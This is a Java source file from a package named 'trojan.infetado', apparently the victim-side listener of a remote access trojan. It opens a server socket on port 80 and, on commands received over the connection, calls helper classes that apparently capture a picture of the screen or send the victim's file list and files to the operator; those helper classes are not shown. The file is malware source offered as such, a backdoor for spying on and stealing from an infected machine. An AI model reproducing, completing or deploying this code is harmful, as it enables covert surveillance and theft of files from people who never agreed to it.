package trojan.infetado;

import java.awt.AWTException;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import network.*;

public class Main {
    
    PrintWriter outt;
    BufferedReader inn;
    InputStream in = null;
    OutputStream out = null;
    Socket socket = null;
    

    public static void main(String[] args) throws AWTException, IOException {

        final String pic = "takepic";
        final String off = "off";
        final String file = "filelist";
    
        DataInputStream din;
        String com;

        ServerSocket servsock = new ServerSocket(80);
            Socket sock = servsock.accept();

           din = new DataInputStream(sock.getInputStream());
           
        String msg = "on";
        do {
            
            msg = din.readUTF();
            
            if (msg.equals(pic)) {
                SendPic s = new SendPic();
            } else if (msg.equals(file)) {
                SendArray sa = new SendArray();
                RecieveNum rn = new RecieveNum();
                SendNome sn = new SendNome();
                SendFile sf = new SendFile();
            }

        } while (!msg.equals(off));
        

    }

}
